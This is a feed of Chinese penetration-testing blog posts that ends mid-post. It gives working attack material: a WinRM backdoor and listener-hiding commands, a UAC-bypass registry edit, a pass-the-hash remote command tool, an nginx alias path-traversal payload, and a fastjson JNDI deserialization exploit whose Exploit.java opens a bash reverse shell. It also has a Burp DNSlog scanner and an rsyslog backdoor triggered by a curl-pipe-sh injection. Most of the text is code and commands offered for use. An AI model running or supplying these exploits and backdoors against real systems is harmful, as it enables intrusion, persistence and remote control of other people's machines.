        <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>基本原理是利用windows的远程管理服务WinRM,在Windows 2003 Server加入了内核级驱动程序(http.sys),用于监听http流量并根据URL进行处理，允许任意用户进程共享用于HTTP流量的TCP端口。通过http.sys,多个进程可以同时监听同一端口的HTTP流量</p><p>系统默认有10个DACl，可以通过<code>netsh http show urlacl</code>看到具体内容，其中5985是http端口，5986是https，在我的Windows Server 2012上面默认没有开启，只开启了一个5985端口。</p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>Windows 2008默认不开启该服务，windows 2012以及以上默认开启该服务。</p><h3 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h3><p>本地机器需要连接远程WinRM服务的时候，本地也需要开启WinRM服务，然后设置信任连接的主机，执行命令:</p><pre class="line-numbers language-none"><code class="language-none">winrm quickconfig -qwinrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>连接(默认端口是5985，需要加上去):</p><pre class="line-numbers language-none"><code class="language-none">winrs -r:http:&#x2F;&#x2F;&lt;ip&gt;:&lt;port&gt; -u:&lt;user&gt; -p:&lt;pass&gt; &lt;command&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置后门"><a href="#设置后门" class="headerlink" title="设置后门:"></a>设置后门:</h3><pre class="line-numbers language-none"><code class="language-none">修改默认端口为80: winrm set winrm&#x2F;config&#x2F;Listener?Address&#x3D;*+Transport&#x3D;HTTP @&#123;Port&#x3D;&quot;80&quot;&#125;还原为5985: winrm set winrm&#x2F;config&#x2F;Listener?Address&#x3D;*+Transport&#x3D;HTTP @&#123;Port&#x3D;&quot;5985&quot;&#125;设置URI: winrm set winrm&#x2F;config&#x2F;Listener?Address&#x3D;*+Transport&#x3D;HTTP @&#123;URLPrefix&#x3D;&quot;lalala&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><pre class="line-numbers language-none"><code class="language-none">查看注册的URL: netsh http show servicestate查看监听配置: winrm e winrm&#x2F;config&#x2F;listener查看配置: winrm get winrm&#x2F;config新增80端口监听: winrm set winrm&#x2F;config&#x2F;service @&#123;EnableCompatibilityHttpListener&#x3D;&quot;true&quot;&#125;删除80端口监听: winrm set winrm&#x2F;config&#x2F;service @&#123;EnableCompatibilityHttpListener&#x3D;&quot;false&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="设置明文连接"><a href="#设置明文连接" class="headerlink" title="设置明文连接"></a>设置明文连接</h3><p>使用pywinrm的时候，如果是直接使用账户密码，在transport可以不用设置，但是需要在服务端设置winrm使用不加密连接:</p><pre class="line-numbers language-none"><code class="language-none">winrm set winrm&#x2F;config&#x2F;service&#x2F;auth &#39;@&#123;Basic&#x3D;&quot;true&quot;&#125;&#39;winrm set winrm&#x2F;config&#x2F;service &#39;@&#123;AllowUnencrypted&#x3D;&quot;true&quot;&#125;&#39;s &#x3D;  winrm.Session(&quot;http:&#x2F;&#x2F;192.168.1.26:5985&quot;,auth&#x3D;(&quot;administrator&quot;,&quot;123456&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>当设置basic可以认证的时候，请求5985可以看到有两种认证方式: <code>Negotiate</code>和<code>basic</code>, <code>basic</code>和普通的head头认证一样，需要base64编码</p><h3 id="winrs-py"><a href="#winrs-py" class="headerlink" title="winrs.py"></a>winrs.py</h3><p>实现一个winrs的客户端，执行cmd命令。因为在pywirnm的源代码里面的powershell是这样的，他调用的还是run_cmd函数，而且是直接<code>powershell -encodedcommand</code>,这很不清。所以只需要完成执行cmd命令，自己写powershell调用就好了。</p><pre class="line-numbers language-none"><code class="language-none">def run_ps(self, script):        &quot;&quot;&quot;base64 encodes a Powershell script and executes the powershell        encoded script command        &quot;&quot;&quot;        # must use utf16 little endian on windows        encoded_ps &#x3D; b64encode(script.encode(&#39;utf_16_le&#39;)).decode(&#39;ascii&#39;)        rs &#x3D; self.run_cmd(&#39;powershell -encodedcommand &#123;0&#125;&#39;.format(encoded_ps))        if len(rs.std_err):            # if there was an error message, clean it it up and make it human            # readable            rs.std_err &#x3D; self._clean_error_msg(rs.std_err)        return rs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="成品"><a href="#成品" class="headerlink" title="成品"></a>成品</h3><pre class="line-numbers language-none"><code class="language-none"># 代码参考: https:&#x2F;&#x2F;lianzhang.org&#x2F;index.php&#x2F;archives&#x2F;8&#x2F;#!&#x2F;usr&#x2F;bin&#x2F;env python# encoding: utf-8import argparseimport urlparseimport requestsimport winrmimport sysdef GetUrlState(url):r &#x3D; requests.get(url)if r.status_code &#x3D;&#x3D; 405:return Trueelse:return Falsedef ParseUrl(url):parse &#x3D; urlparse.urlparse(url)uri &#x3D; parse.pathip &#x3D; parse.netlocport &#x3D; 80 if parse.port is None else parse.portreturn ip,port,uridef RunCmd(ip,port,uri,cmd,**kwargs):if kwargs.get(&quot;hashpasswd&quot;):try:Windwoscmd &#x3D; winrm.Session(&#39;http:&#x2F;&#x2F;&#39; + ip + &quot;:&quot; + str(port) + uri, auth&#x3D;(kwargs.get(&quot;user&quot;), &#39;00000000000000000000000000000000:&#39;+kwargs.get(&quot;hashpasswd&quot;)),                           transport&#x3D;&quot;ntlm&quot;, server_cert_validation&#x3D;&#39;ignore&#39;)Result &#x3D; Windwoscmd.run_cmd(str(cmd))sys.stdout.write(Result.std_err.decode(&#39;gbk&#39;))sys.stdout.write(Result.std_out.decode(&#39;gbk&#39;))sys.stdout.write(&#39;\n&#39;)except Exception as ex:print &quot;[+]&gt; Hash发生错误:&quot; + str(ex)else:try:Windwoscmd &#x3D; winrm.Session(&#39;http:&#x2F;&#x2F;&#39; + ip + &quot;:&quot; + str(port) + uri, auth&#x3D;(kwargs.get(&quot;user&quot;), kwargs.get(&quot;passwd&quot;)),                           transport&#x3D;&quot;basic&quot;, server_cert_validation&#x3D;&#39;ignore&#39;)Result &#x3D; Windwoscmd.run_cmd(str(cmd))sys.stdout.write(Result.std_err.decode(&#39;gbk&#39;))sys.stdout.write(Result.std_out.decode(&#39;gbk&#39;))sys.stdout.write(&#39;\n&#39;)except Exception as ex:print &quot;[+]&gt; Pass发生错误:&quot; + str(ex)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:#windows 2008上面是LM-HASH:NTLM-HASH的方式，需要修改源代码，去掉上面的一堆0加上冒号#windows 2012以及之后只能抓到NTLM的Hash，直接使用即可example_text &#x3D; &#39;&#39;&#39;example:python winrs.py -r http:&#x2F;&#x2F;192.168.1.26:5985&#x2F;wsman -u administrator -H 32ed87bdb5fdc5e9cba88547376818d4 -c &quot;whoami&quot;&#39;&#39;&#39;parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;WinRMTTools, only work &gt;&#x3D; Windows Server 2012&#39;,epilog&#x3D;example_text)parser.add_argument(&quot;-r&quot;, &quot;--remote&quot;, metavar&#x3D;&quot;&quot;, required&#x3D;True, help&#x3D;&quot;http:&#x2F;&#x2F;192.168.1.26:5985&#x2F;wsman&quot;)parser.add_argument(&quot;-u&quot;, &quot;--user&quot;, metavar&#x3D;&quot;&quot;, help&#x3D;&quot;username&quot;, default&#x3D;&quot;administrator&quot;)parser.add_argument(&quot;-p&quot;, &quot;--passwd&quot;, metavar&#x3D;&quot;&quot;, help&#x3D;&quot;password&quot;, default&#x3D;&quot;&quot;)parser.add_argument(&quot;-H&quot;, &quot;--hashpasswd&quot;, metavar&#x3D;&quot;&quot;, help&#x3D;&quot;NTLM-Hash&quot;, default&#x3D;&quot;&quot;)parser.add_argument(&quot;-c&quot;, &quot;--command&quot;, metavar&#x3D;&quot;&quot;, help&#x3D;&quot;cmd&quot;, default&#x3D;&quot;whoami&quot;)args &#x3D; parser.parse_args()if GetUrlState(args.remote):ip, port, uri &#x3D; ParseUrl(args.remote)RunCmd(ip, port, uri, args.command, user&#x3D;args.user, passwd&#x3D;args.passwd, hashpasswd&#x3D;args.hashpasswd)else:print &quot;[*]&gt; Windwos WinRM服务未开启请检查服务是否开启！&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ol><li>WinRM服务受UAC影响，本地管理员用户组只有administrator可以登录，其他管理员用户无法远程登录WinRM，如果要允许其他管理员用户远程登录WinRM，需要修改注册表:</li></ol><pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>修改URLPrefix之后，因为pywinrm默认搜索wsman，所以如果修改URLPrefix之后程序需要重写。</li></ol><ul><li><a href="https://www.cnblogs.com/0x4D75/p/11381449.html">https://www.cnblogs.com/0x4D75/p/11381449.html</a></li><li><a href="https://lianzhang.org/index.php/archives/8/">https://lianzhang.org/index.php/archives/8/</a></li><li><a href="https://paper.seebug.org/1004/">https://paper.seebug.org/1004/</a></li><li><a href="https://threathunter.org/topic/5940a6e59c58e020408a79ea">https://threathunter.org/topic/5940a6e59c58e020408a79ea</a></li><li><a href="https://www.4hou.com/technology/19806.html">https://www.4hou.com/technology/19806.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>nginx的目录穿越</title>
      <link href="/2019/09/17/nginx_path_traversle.html"/>
      <url>/2019/09/17/nginx_path_traversle.html</url>
      
        <content type="html"><![CDATA[<p>nginx在使用proxy_pass的时候，需要处理静态文件有时候会这样做:</p><pre class="line-numbers language-none"><code class="language-none">location &#x2F;static &#123;               alias &#x2F;home&#x2F;uploads&#x2F;static&#x2F;;       &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">curl vuln.com&#x2F;static..&#x2F;requirements.pip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面如果是两个路径最后都没有带<code>/</code>或者都带<code>/</code>则该漏洞不存在。</p><p>代理末尾添加/之后，nginx会先对uri进行normalized处理，使用../读取文件会失败，当没有添加/的时候，nginx会把原请求直接转发给后端服务器，所以可以读取成功。</p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>fastjson被动扫描Burp插件</title>
      <link href="/2019/07/22/fastjson-rce.html"/>
      <url>/2019/07/22/fastjson-rce.html</url>
      
        <content type="html"><![CDATA[<p>2019/08/13 Update.</p><ol><li>代码没有考虑到json里面套json的情况。</li><li>代码没有考虑到在使用x-www-form-urlencoded的参数是json的情况。<br>这两个加上去之后感觉每个请求的时间都会增加，先挖坑。</li></ol><p>2019/08/02 Update:</p><ol><li>之前的代码太的太烂，去掉了不用的代码</li><li>增加了hash验证，如果已经请求过的URL第二次就不检测了，需建立<code>/var/tmp/hash.txt</code>文件（自己看着改吧)</li><li>如果不熟悉，就看官方文档，文档，文档。</li></ol><pre class="line-numbers language-none"><code class="language-none">main.py#&#x2F;usr&#x2F;bin&#x2F;env python#! -*- coding:utf-8 -*-from burp import IBurpExtender # 定义插件的基本信息类from burp import IHttpListener # http流量监听类from burp import IRequestInfofrom noauth import noauth_requestimport hashlibclass BurpExtender(IBurpExtender, IHttpListener):    def registerExtenderCallbacks(self, callbacks):        self._callbacks &#x3D; callbacks        self._helpers &#x3D; callbacks.getHelpers() # 通用函数        self._callbacks.setExtensionName(&quot;fastjson_scan&quot;)        print &quot;load fastjson_scan plugin success!&quot;        print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;        # register ourselves as an HTTP listener        callbacks.registerHttpListener(self)        def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):        if toolFlag &#x3D;&#x3D; 4 or toolFlag &#x3D;&#x3D; 64 or toolFlag &#x3D;&#x3D; 16 or toolFlag &#x3D;&#x3D; 32:            if  messageIsRequest:                request &#x3D; messageInfo.getRequest()                analyzedRequest &#x3D; self._helpers.analyzeRequest(request)                contype &#x3D; analyzedRequest.getContentType()  #get Content-type, 这里看官方文档                url &#x3D; str(messageInfo.getUrl())                with open(&#39;&#x2F;var&#x2F;tmp&#x2F;hash.txt&#39;) as f:                    lines &#x3D; f.read().splitlines()                m &#x3D; hashlib.md5()                m.update(url)                print url                if contype &#x3D;&#x3D; 4 and m.hexdigest() not in lines:    #是的，json的时候type等于4                    with open(&#39;&#x2F;var&#x2F;tmp&#x2F;hash.txt&#39;,&#39;a+&#39;) as f:                        f.write(m.hexdigest()+&quot;\n&quot;)                    print &quot;[Info]Check url is: %s&quot; % url                    cur &#x3D; noauth_request(url)                    noauth_result &#x3D; cur.run()                    if noauth_result:                         print &quot;[Critical] Found it is a Fastjson RCE %s&quot; % noauth_result[0]                    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;                    print &quot;&quot;                else:                    pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>fastjson在<code>1.2.47</code>以下，包括1.2.47存在反序列化导致的远程命令执行，payload:</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;ip:8000&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后在远程主机开启rmi服务和<code>Exploit.class</code>web服务就可以打了。</p><pre class="line-numbers language-none"><code class="language-none">java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;ip:8888&#x2F;#Exploit 8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Exploit.javajavac Exploit.java  &#x2F;&#x2F;编译为classjava Exploit  &#x2F;&#x2F;运行测试然后用python的http模块起一个web服务就可用。public class Exploit &#123;    public Exploit()&#123;        try &#123;            &#x2F;&#x2F; Runtime.getRuntime().exec(&quot;calc&quot;);            java.lang.Runtime.getRuntime().exec(                    new String[]&#123;&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;4545 0&gt;&amp;1&quot;&#125;);        &#125; catch(Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    public static void main(String[] argv)&#123;        Exploit e &#x3D; new Exploit();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先你要有一个可以打的接口，这就很蛋疼了。想了半天找了lufei写的一个xxescanner，想了下可以修改为自己的检测工具，但是到最后没成功。</p><p>java不熟悉只能转向自己熟悉的python，最后综合了下终于写出来了。</p><p>###DNSlog</p><p>因为使用新的payload打了存在fastjson漏洞的应用之后，老的payload就可以打了 :)<br>从小密圈里面找到了一份POC</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;baidu.com&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以利用dnslog，根据val更换为自己的服务器，辣么久可以了。这个poc在1.2.48之后就不能用了，简直是绝佳的POC。<br>dnslog要用bit4改之后的那个。</p><p>思路就是请求自己的解析，然后根据接口去检测是否有对应的解析:</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;test.baidu.com&quot;&#125;&#125;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;apiquery&#x2F;dns&#x2F;test&#x2F;a2f78f403d7b8b92ca3486bb4dc0e498&#x2F;&#x2F;&#x2F;查询是否有test的解析<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>实际中可以生成一串随机字符串，然后去请求是否有对应的解析:</p><pre class="line-numbers language-none"><code class="language-none">def genRandom(self):    letters &#x3D; string.ascii_lowercase    s &#x3D; &#39;&#39;.join(random.sample(letters, 10))    payload &#x3D; hashlib.md5(s + str(time.time())).hexdigest()    return payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>两个步骤:</p><ol><li>检测到请求中是否有json格式的请求，这里可以根据<code>Content-Type</code>（可能不准确)，检测之后，构造body，打POC</li><li>然后再去检测自己的dnslog是否存在相应的记录</li></ol><p>###不足<br>requests是同步请求，所以如果你的dnslog服务器放在太平洋那边，你的burp会让你怀疑人生，加nginx反代，加cdn。</p><p>MD终于弄完了。</p><pre class="line-numbers language-none"><code class="language-none">main.py#&#x2F;usr&#x2F;bin&#x2F;env python#! -*- coding:utf-8 -*-import refrom burp import IBurpExtender # 定义插件的基本信息类from burp import IHttpListener # http流量监听类from noauth import noauth_requestres_host &#x3D; re.compile(r&#39;Host: ([^,]*)&#39;)res_path &#x3D; re.compile(r&#39;POST ([^ ]*) HTTP&#x2F;&#39;)class BurpExtender(IBurpExtender, IHttpListener):    def registerExtenderCallbacks(self, callbacks):        self._callbacks &#x3D; callbacks        self._helpers &#x3D; callbacks.getHelpers() # 通用函数        self._callbacks.setExtensionName(&quot;fastjson_scan&quot;)        print &quot;load fastjson_scan plugin success!&quot;        print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;        # register ourselves as an HTTP listener        callbacks.registerHttpListener(self)        def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):        if toolFlag &#x3D;&#x3D; 4 or toolFlag &#x3D;&#x3D; 64 or toolFlag &#x3D;&#x3D; 16 or toolFlag &#x3D;&#x3D; 32:            if not messageIsRequest:                response &#x3D; messageInfo.getResponse() # get response                analyzedResponse &#x3D; self._helpers.analyzeResponse(response)                body &#x3D; response[analyzedResponse.getBodyOffset():]                 body_string &#x3D; body.tostring() # get response_body                request &#x3D; messageInfo.getRequest()                analyzedRequest &#x3D; self._helpers.analyzeResponse(request)                request_header &#x3D; analyzedRequest.getHeaders()                # print request_header[0]                # print request_header                header_string &#x3D; &#39;&#39;.join(request_header)                # print header_string                # try:                #     method,path &#x3D; res_path.findall(request_header[0])[0]                #     host &#x3D; res_host.findall(request_header[1])[0]                #     print flag_json                #     url &#x3D; method+&quot; &quot;+host+path                # except:                #     url &#x3D; &quot;&quot;                # if method&#x3D;&#x3D;&quot;POST&quot; and flag_json:                if r&quot;application&#x2F;json&quot; in header_string:                    # 检测GET请求的接口                    # print path                    # print host                    try:                        path &#x3D; res_path.findall(request_header[0])[0]                        host &#x3D; res_host.findall(request_header[1])[0]                        target &#x3D; host + path                    except:                        target &#x3D; &#39;&#39;                    print &quot;[Info]Check url is:&quot; + host + path                    cur &#x3D; noauth_request(host,path)                    noauth_result &#x3D; cur.run()                    if noauth_result:                         print &quot;[Critical] Found it is a Fastjson RCE %s&quot; % noauth_result[0]                    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;                    print &quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">noauth.py#!&#x2F;usr&#x2F;bin&#x2F;env python#! -*- coding:utf-8 -*-import requestsimport randomimport stringimport hashlibimport timeheaders&#x3D;&#123;        &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;66.0.3359.139 Safari&#x2F;537.36&quot;,    &quot;Accept-Language&quot;:&quot;zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,mt;q&#x3D;0.7,zh-TW;q&#x3D;0.6&quot;,    &quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,    &quot;Accept&quot;:&quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8&quot;&#125;headers2 &#x3D; &#123;&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;66.0.3359.139 Safari&#x2F;537.36&quot;,&quot;Accept-Language&quot;: &quot;zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,mt;q&#x3D;0.7,zh-TW;q&#x3D;0.6&quot;,&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,&quot;Accept&quot;: &quot;*&quot;,&quot;Content-Type&quot;: &quot;application&#x2F;json&quot;&#125;class noauth_request(object):    # 未授权访问漏洞检测    def __init__(self,host,path):        self.url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+host+path        self.randomStr &#x3D; &#39;&#39;    def run(self):        return_list &#x3D; []        self.randomStr &#x3D; self.genRandom()        if self.verify():            return_list.append(self.url)        return return_list    def verify(self):        payload &#x3D; &#39;&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;&#39; + self.randomStr + &#39;&lt;domain&gt;&quot;&#125;&#125;&#39;        # print payload        try:            res &#x3D; requests.post(url&#x3D;self.url, data&#x3D;payload, timeout&#x3D;20, headers&#x3D;headers2, verify&#x3D;False)        except Exception, e:            print str(e)        poc_url &#x3D; &quot;http:&#x2F;&#x2F;&lt;domain&gt;&#x2F;apiquery&#x2F;dns&#x2F;&quot; + self.randomStr  + &quot;&#x2F;&lt;token&gt;&#x2F;&quot;        # print poc_url        try:            req &#x3D; requests.get(poc_url, headers&#x3D;headers)            if self.randomStr in req.content:                return True        except Exception,e:            print str(e)        return False    def genRandom(self):        letters &#x3D; string.ascii_lowercase        s &#x3D; &#39;&#39;.join(random.sample(letters, 10))        payload &#x3D; hashlib.md5(s + str(time.time())).hexdigest()        return payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个文章很精彩呀，所以被删除了啊</p><p><img src="./images/fastjson1.png"></p><ul><li><a href="http://xdxd.love/2015/04/20/burpsuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B9%8Bpython%E7%AF%87/">http://xdxd.love/2015/04/20/burpsuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B9%8Bpython%E7%AF%87/</a></li><li><a href="https://thief.one/2018/05/04/1/">https://thief.one/2018/05/04/1/</a></li><li><a href="https://github.com/BugScanTeam/DNSLog">https://github.com/BugScanTeam/DNSLog</a></li><li><a href="https://github.com/lufeirider/Project.git">https://github.com/lufeirider/Project.git</a></li><li><a href="https://github.com/bit4woo/DNSLog">https://github.com/bit4woo/DNSLog</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Rsyslog Backdoor</title>
      <link href="/2019/07/21/rsyslog-backdoor.html"/>
      <url>/2019/07/21/rsyslog-backdoor.html</url>
      
        <content type="html"><![CDATA[<p>Centos自带rsyslog，网上有具体利用过程，这里我记录下简单的坑。</p><h3 id="建立后门"><a href="#建立后门" class="headerlink" title="建立后门"></a>建立后门</h3><pre class="line-numbers language-none"><code class="language-none">echo -e &#39;#!&#x2F;bin&#x2F;sh\nsh -c &quot;$1&quot;&#39;&gt;&#x2F;bin&#x2F;atgchmod 755 &#x2F;bin&#x2F;atgecho &quot;auth.*,regex, abcd  ^&#x2F;bin&#x2F;atg&quot; &gt; &#x2F;etc&#x2F;rsyslog.d&#x2F;README.conf重启生效(Centos用下面的systemctl):&#x2F;etc&#x2F;init.d&#x2F;rsyslog restartsystemctl restart rsyslog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="利用"><a href="#利用" class="headerlink" title="利用:"></a>利用:</h3><pre class="line-numbers language-none"><code class="language-none">echo &quot;xxxxx&#39;;curl https:&#x2F;&#x2F;shell.now.sh&#x2F;127.0.0.1:1337 | sh;&#39;&quot;|socat STDIO TCP4:127.0.0.1:22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="擦屁股"><a href="#擦屁股" class="headerlink" title="擦屁股:"></a>擦屁股:</h3><pre class="line-numbers language-none"><code 